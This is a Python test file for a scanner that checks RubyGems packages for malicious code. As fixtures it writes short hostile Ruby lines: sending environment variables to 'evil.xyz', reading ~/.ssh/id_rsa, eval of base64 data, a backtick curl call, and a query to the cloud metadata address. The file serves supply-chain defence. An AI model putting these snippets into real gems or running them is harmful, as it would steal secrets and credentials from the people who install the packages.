"""Tests for RubyGems static analysis scanner."""

import tempfile
from pathlib import Path

from app.core.config import Settings
from app.scanners.static_analysis_rubygems import RubyGemsStaticAnalysisScanner
from app.schemas.package import PackageInfo


def _scanner() -> RubyGemsStaticAnalysisScanner:
    return RubyGemsStaticAnalysisScanner(Settings())


def _make_package() -> PackageInfo:
    return PackageInfo(name="test-gem", version="1.0.0", registry="rubygems")


def _write_temp(content: str, name: str = "extconf.rb") -> Path:
    p = Path(tempfile.mktemp(suffix=f"_{name}"))
    p.write_text(content)
    return p


async def test_pass_safe_mkmf_extconf():
    scanner = _scanner()
    f = _write_temp("require 'mkmf'\nhave_library('ssl')\ncreate_makefile('my_ext')")
    try:
        result = await scanner.scan(_make_package(), [f])
        assert result.verdict == "pass"
    finally:
        f.unlink(missing_ok=True)


async def test_detect_env_exfil():
    scanner = _scanner()
    f = _write_temp("data = ENV.to_h\nNet::HTTP.post('https://evil.xyz', data.to_json)")
    try:
        result = await scanner.scan(_make_package(), [f])
        assert result.verdict in ("warn", "fail")
    finally:
        f.unlink(missing_ok=True)


async def test_detect_ssh_access():
    scanner = _scanner()
    f = _write_temp("key = File.read(File.expand_path('~/.ssh/id_rsa'))")
    try:
        result = await scanner.scan(_make_package(), [f])
        assert result.verdict == "fail"
    finally:
        f.unlink(missing_ok=True)


async def test_detect_base64_eval():
    scanner = _scanner()
    f = _write_temp("eval(Base64.decode64('cHV0cyAiaGVsbG8i'))")
    try:
        result = await scanner.scan(_make_package(), [f])
        assert result.verdict == "fail"
    finally:
        f.unlink(missing_ok=True)


async def test_detect_backtick_curl():
    scanner = _scanner()
    f = _write_temp("`curl https://evil.xyz/steal`")
    try:
        result = await scanner.scan(_make_package(), [f])
        assert result.verdict in ("warn", "fail")
    finally:
        f.unlink(missing_ok=True)


async def test_detect_cloud_metadata():
    scanner = _scanner()
    f = _write_temp("URI.open('http://169.254.169.254/latest/meta-data/')")
    try:
        result = await scanner.scan(_make_package(), [f])
        assert result.verdict == "fail"
    finally:
        f.unlink(missing_ok=True)


async def test_skip_metadata_yaml():
    scanner = _scanner()
    meta = _write_temp("extensions:\n- ext/extconf.rb", name="metadata.yaml")
    try:
        result = await scanner.scan(_make_package(), [meta])
        assert result.verdict == "pass"
    finally:
        meta.unlink(missing_ok=True)


async def test_clean_ruby_code():
    scanner = _scanner()
    f = _write_temp("module MyGem\n  VERSION = '1.0.0'\nend", name="my_gem.rb")
    try:
        result = await scanner.scan(_make_package(), [f])
        assert result.verdict == "pass"
    finally:
        f.unlink(missing_ok=True)
